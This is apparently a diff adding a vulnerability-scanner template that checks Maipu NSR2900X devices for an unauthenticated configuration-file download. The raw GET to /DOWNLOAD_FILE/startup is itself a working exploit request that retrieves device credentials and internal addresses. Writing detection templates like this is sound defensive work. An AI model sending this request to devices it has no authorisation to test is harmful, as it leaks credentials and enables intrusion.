@@ -1,0 +1,29 @@
+id: maipu-nsr2900x-config-download
+
+info:
+  name: Maipu NSR2900X Configuration File Unauthorized Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Maipu configuration management system has a vulnerability that allows unauthorized download of configuration files. This can lead to leaking sensitive device information such as usernames, passwords, and internal IPs, enabling further attacks.
+  tags: unauthorized-access, information-leak
+
+http:
+  - raw:
+      - |
+        GET /DOWNLOAD_FILE/startup HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "startup"
+          - "privilege"
+        part: body
